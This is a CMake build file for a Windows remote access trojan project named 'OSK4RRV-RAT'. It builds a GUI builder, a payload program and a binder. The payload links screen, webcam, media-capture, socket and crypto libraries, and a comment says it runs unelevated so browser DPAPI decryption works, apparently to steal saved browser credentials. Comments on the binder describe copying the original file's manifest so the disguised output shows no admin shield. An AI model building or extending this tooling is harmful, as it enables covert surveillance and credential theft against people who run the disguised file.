cmake_minimum_required(VERSION 3.20)
project(OSK4RRV-RAT CXX)

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

set(IMGUI_DIR "${CMAKE_CURRENT_SOURCE_DIR}/src/Dear Imgui")

set(IMGUI_SOURCES
    "${IMGUI_DIR}/imgui.cpp"
    "${IMGUI_DIR}/imgui_draw.cpp"
    "${IMGUI_DIR}/imgui_tables.cpp"
    "${IMGUI_DIR}/imgui_widgets.cpp"
    "${IMGUI_DIR}/imgui_demo.cpp"
    "${IMGUI_DIR}/imgui_impl_win32.cpp"
    "${IMGUI_DIR}/imgui_impl_dx11.cpp"
)

set(APP_SOURCES
    "src/main.cpp"
    "src/rat.cpp"
)

add_executable(${PROJECT_NAME} WIN32 ${APP_SOURCES} ${IMGUI_SOURCES})

target_include_directories(${PROJECT_NAME} PRIVATE
    "src"
    "${IMGUI_DIR}"
)

target_link_libraries(${PROJECT_NAME} PRIVATE
    d3d11
    d3dcompiler
    dxgi
    winhttp
)

target_compile_definitions(${PROJECT_NAME} PRIVATE UNICODE _UNICODE)

if(MSVC)
    target_compile_options(${PROJECT_NAME} PRIVATE /W3 /utf-8)
    # Builder runs as user (no UAC elevation required)
    set_target_properties(${PROJECT_NAME} PROPERTIES WIN32_MANIFEST "src/app.manifest")
endif()

add_executable(payload WIN32 src/payload.cpp)
target_link_libraries(payload PRIVATE ws2_32 gdiplus winmm vfw32 shell32 shlwapi crypt32 bcrypt ole32
    mfplat mfreadwrite mfuuid mf)
target_compile_definitions(payload PRIVATE UNICODE _UNICODE)
if(MSVC)
    target_compile_options(payload PRIVATE /W3 /utf-8)
    # Payload runs as user (no UAC) so browser DPAPI works for current user
    set_target_properties(payload PROPERTIES WIN32_MANIFEST "src/app.manifest")
endif()

add_executable(binder WIN32 src/binder.cpp)
target_link_libraries(binder PRIVATE shell32)
target_compile_definitions(binder PRIVATE UNICODE _UNICODE)
if(MSVC)
    target_compile_options(binder PRIVATE /W3 /utf-8)
    # Binder runs as a normal user (asInvoker) — NO forced elevation.
    # The builder later transplants the ORIGINAL file's manifest into the final
    # output, so the built exe ends up with exactly the same privileges as the
    # file the user selected (no admin shield unless the original has one).
    set_target_properties(binder PROPERTIES WIN32_MANIFEST "src/app.manifest")
endif()
